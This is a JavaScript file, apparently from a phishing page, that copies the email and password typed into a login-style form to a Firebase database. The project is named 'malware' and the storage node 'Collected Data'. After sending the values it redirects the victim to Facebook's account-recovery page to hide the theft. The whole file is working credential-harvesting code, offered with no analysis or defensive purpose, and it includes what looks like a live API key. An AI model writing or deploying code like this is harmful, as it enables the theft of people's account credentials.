var firebaseConfig = {
  apiKey: "AIzaSyCN8v7646WP6It1dy1YdUaKTaFoXsuhGag",
  authDomain: "malware-b55c8.firebaseapp.com",
  databaseURL: "https://malware-b55c8-default-rtdb.firebaseio.com",
  projectId: "malware-b55c8",
  storageBucket: "malware-b55c8.appspot.com",
  messagingSenderId: "824762590254",
  appId: "1:824762590254:web:395266e09d6f6d6069ebbf",
  measurementId: "G-MM0DVRHMQJ"
};

firebase.initializeApp(firebaseConfig);
document.getElementById('contactForm')
.addEventListener('submit', submitForm);

var MessageRef = firebase.database().ref('Collected Data');

function submitForm(e) {

    e.preventDefault();

    // Get values
    var email = getInputVal('email');
    var password = getInputVal('password');

    saveMessage(email, password);
    document.getElementById('contactForm').reset();
    setTimeout(function() {
        location = 'https://www.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&_rdr'
    }, 100)
}

// Function to get get form values
function getInputVal(id) {
    return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(email, password) {
    var newMessageRef = MessageRef.push();
    newMessageRef.set({
        email: email,
        password: password,
    });
}
